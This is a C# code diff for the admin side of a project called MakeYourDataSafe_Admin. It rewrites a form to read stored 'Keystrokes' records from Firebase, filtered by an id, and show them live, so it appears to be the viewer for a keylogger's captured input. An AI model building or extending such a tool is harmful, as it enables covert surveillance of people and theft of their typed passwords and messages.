@@ -17,9 +17,15 @@ namespace MakeYourDataSafe_Admin
 {
     public partial class Keys : Form
     {
-        public Keys(int id)
+        private static string id;
+        public Keys()
         {
             InitializeComponent();
+        }
+
+        public Keys(string xd):this()
+        {
+            id = xd;
         }
 
         private void close_Click(object sender, EventArgs e)
@@ -32,9 +38,17 @@ namespace MakeYourDataSafe_Admin
         {
             try
             {
-                var child = client.Child("Messages");
+                var child = client.Child("Keystrokes");
+                var data = await client.Child("Keystrokes").OnceAsync<GetKeystrokes>();
+                foreach (var i in data)
+                {
+                    if (i.Object.id == id)
+                    {
+                        this.textBox1.Text += i.Object.key;
+                    }
+                }
                 var observable = child.AsObservable<GetKeystrokes>();
-                var subscription = observable.Where(item => !string.IsNullOrEmpty(item.Key)).Subscribe(item => displayKey(item));
+                var subscription = observable.Where(item => !string.IsNullOrEmpty(item.Key)).Where(item => item.Key == id).Subscribe(item => displayKey(item));
             }
             catch (FirebaseException ex)
             {
@@ -48,25 +62,15 @@ namespace MakeYourDataSafe_Admin
 
         private void displayKey(FirebaseEvent<GetKeystrokes> item)
         {
-            if (this.InvokeRequired)
-                this.Invoke(new displayMessageDelegate(this.displayMessage), item);
-            else
-            {
-                if (item.Object?.id == Form1.username && item.Object?.Author == partner)
-                {
-                    textBox3.Text += item.Object.Author + ": " + item.Object.Content + "\r\n";
-                }
-                else if (item.Object?.Recipient == Form1.username && item.Object?.Author == partner && item.Object?.File != null)
-                {
-                    textBox3.Text += item.Object.Author + ": " + item.Object.Filename + "\r\n";
-                    File.WriteAllLines("C:\\Users\\szicsa\\Downloads" + item.Object.Filename, item.Object.File);
-
-                }
-
-            }
+            textBox1.Text += item.Object.key;
         }
 
         private void Keys_Load(object sender, EventArgs e)
+        {
+            Run();
+        }
+
+        private void textBox1_TextChanged(object sender, EventArgs e)
         {
 
         }
